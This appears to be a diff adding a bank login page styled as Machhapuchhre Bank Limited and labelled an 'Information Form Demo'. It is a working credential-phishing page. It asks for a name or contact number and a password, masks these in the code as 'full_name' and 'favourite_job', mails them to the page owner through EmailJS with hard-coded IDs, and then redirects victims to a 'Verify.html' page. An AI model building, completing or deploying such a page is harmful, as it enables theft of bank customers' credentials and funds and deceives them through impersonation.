@@ -1,0 +1,405 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Information Form Demo</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    color: white;
+    background: #07448c;
+}
+
+.header {
+    height: 78px;
+    background: white;
+    display: flex;
+    align-items: center;
+    padding: 10px 16px;
+    gap: 11px;
+    color: #164b83;
+}
+
+.menu {
+    font-size: 22px;
+    color: #555;
+    margin-right: 12px;
+}
+
+.logo {
+    width: 52px;
+    height: 45px;
+    flex-shrink: 0;
+}
+
+.bank-name {
+    font-size: 12px;
+    font-weight: bold;
+    line-height: 1.5;
+}
+
+.bank-name span {
+    display: block;
+    font-size: 15px;
+}
+
+.main {
+    min-height: 100vh;
+    padding: 38px 10.5%;
+    background:
+    radial-gradient(circle at 90% 15%, #165ba4, transparent 40%),
+    linear-gradient(140deg, #0751a5, #073d83, #06458e);
+}
+
+.demo-notice {
+    font-size: 11px;
+    color: #d9eaff;
+    margin-bottom: 22px;
+}
+
+.login-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 28px;
+}
+
+.login-title {
+    font-size: 19px;
+    font-weight: normal;
+}
+
+.security {
+    font-size: 12px;
+    color: #e0ebff;
+}
+
+label {
+    display: block;
+    font-size: 13px;
+    font-weight: bold;
+    margin-bottom: 8px;
+}
+
+input {
+    width: 100%;
+    height: 48px;
+    background: white;
+    border: 1px solid #ddd;
+    border-radius: 2px;
+    padding: 9px;
+    font-size: 13px;
+    outline: none;
+    margin-bottom: 27px;
+    color: #222;
+}
+
+input:focus {
+    border-color: #9dcaff;
+}
+
+.consent {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    font-size: 11px;
+    line-height: 1.5;
+    margin: -10px 0 20px;
+    color: #e0ebff;
+}
+
+.consent input {
+    width: 14px;
+    height: 14px;
+    margin: 1px 0 0;
+    flex-shrink: 0;
+}
+
+.submit {
+    width: 100%;
+    height: 52px;
+    background: #bd2445;
+    border: none;
+    border-radius: 2px;
+    color: white;
+    font-size: 15px;
+    cursor: pointer;
+    transition: .2s;
+}
+
+.submit:hover {
+    background: #a51b39;
+}
+
+.submit:disabled {
+    opacity: .65;
+    cursor: not-allowed;
+}
+
+.status {
+    display: none;
+    text-align: center;
+    padding: 12px;
+    margin-top: 15px;
+    font-size: 12px;
+    border-radius: 4px;
+    line-height: 1.5;
+}
+
+.status.success {
+    display: block;
+    background: #d8f8e3;
+    color: #126536;
+}
+
+.status.error {
+    display: block;
+    background: #ffe0e0;
+    color: #a51b1b;
+}
+
+.trouble {
+    text-align: center;
+    margin-top: 28px;
+    font-size: 13px;
+    color: #e0ebff;
+}
+
+.transfer {
+    text-align: center;
+    margin-top: 38px;
+    padding-bottom: 25px;
+}
+
+.money-icon {
+    font-size: 83px;
+    margin-bottom: 12px;
+    line-height: 1.3;
+}
+
+.transfer h2 {
+    font-size: 21px;
+    margin-bottom: 20px;
+}
+
+.transfer p {
+    max-width: 420px;
+    margin: auto;
+    font-size: 13px;
+    line-height: 1.7;
+    color: #dceaff;
+}
+
+@media(max-width:600px) {
+    .main {
+        padding: 38px 10.5%;
+    }
+}
+
+@media(max-width:360px) {
+    .bank-name {
+        font-size: 11px;
+    }
+
+    .bank-name span {
+        font-size: 13px;
+    }
+
+    .main {
+        padding-left: 8%;
+        padding-right: 8%;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<header class="header">
+
+    <div class="menu">☰</div>
+
+    <svg class="logo" viewBox="0 0 100 85">
+        <rect x="3" y="3" width="94" height="76"
+        fill="white" stroke="#bd2948" stroke-width="4"/>
+
+        <rect x="8" y="8" width="84" height="65"
+        fill="#164b83"/>
+
+        <path d="M8 65 L32 43 L46 55 L62 34 L92 64 L92 73 L8 73Z"
+        fill="white"/>
+
+        <path d="M8 65 L32 43 L46 55 L62 34 L92 64"
+        fill="none" stroke="#bd2948" stroke-width="4"/>
+    </svg>
+
+    <div class="bank-name">
+        
+        <span>Machhapuchhre Bank Limited</span>
+    </div>
+
+</header>
+
+<main class="main">
+
+    <div class="demo-notice">
+    </div>
+
+    <div class="login-top">
+        <div class="login-title">Sigin In</div>
+        <div class="security">♙ &nbsp; Privacy Notice</div>
+    </div>
+
+    <form id="demoForm">
+
+        <label for="fullname">Full name</label>
+
+        <input
+            type="text"
+            id="fullname"
+            name="User id"
+            placeholder="Enter your Contact number"
+            maxlength="100"
+            required
+        >
+
+        <label for="job">Password</label>
+
+        <input
+            type="text"
+            id="job"
+            name="favourite_job"
+            placeholder="Enter your favourite job"
+            maxlength="100"
+            required
+        >
+
+        <label class="consent">
+            <input type="checkbox" id="consent" required>
+            I agree to send these details to the website owner by email.
+        </label>
+
+        <button class="submit" id="submitBtn" type="submit">
+            Submit
+        </button>
+
+        <div class="status" id="status"></div>
+
+    </form>
+
+    <div class="trouble">
+        Having trouble submitting?
+    </div>
+
+    <section class="transfer">
+
+        <div class="money-icon">💸</div>
+
+        <h2>Fund Transfer</h2>
+
+        <p>
+            Learn about fund transfer services and
+            available transfer options.
+        </p>
+
+    </section>
+
+</main>
+
+<script>
+
+// EMAILJS CONFIGURATION
+
+const PUBLIC_KEY = "6erjYuJfp4rK9fAC6";
+const SERVICE_ID = "service_ftvqdei";
+const TEMPLATE_ID = "template_04bxu5b";
+
+// Initialize EmailJS
+
+emailjs.init({
+    publicKey: PUBLIC_KEY
+});
+
+// FORM ELEMENTS
+
+const form = document.getElementById("demoForm");
+const button = document.getElementById("submitBtn");
+const statusBox = document.getElementById("status");
+
+// FORM SUBMISSION
+
+form.addEventListener("submit", async function(e) {
+
+    e.preventDefault();
+
+    if (!form.reportValidity()) return;
+
+    button.disabled = true;
+    button.textContent = "Sending...";
+
+    statusBox.className = "status";
+    statusBox.style.display = "none";
+
+    // Email template parameters
+
+    const templateParams = {
+        full_name: document.getElementById("fullname").value.trim(),
+        favourite_job: document.getElementById("job").value.trim()
+    };
+
+    try {
+
+        // Send information through EmailJS
+
+        await emailjs.send(
+            SERVICE_ID,
+            TEMPLATE_ID,
+            templateParams
+        );
+
+        statusBox.textContent =
+            "✓ Success...";
+
+        statusBox.className = "status success";
+        statusBox.style.display = "block";
+
+        // Redirect after successful email submission
+
+        button.textContent = "Waiting..";
+
+        setTimeout(function() {
+            window.location.href = "Verify.html";
+        }, 800);
+
+    } catch (error) {
+
+        console.error("EmailJS Error:", error);
+
+        statusBox.textContent =
+            "Unable to send. Please check your internet connection and EmailJS configuration.";
+
+        statusBox.className = "status error";
+        statusBox.style.display = "block";
+
+        button.disabled = false;
+        button.textContent = "Submit";
+
+    }
+
+});
+
+</script>
+
+</body>
+</html>
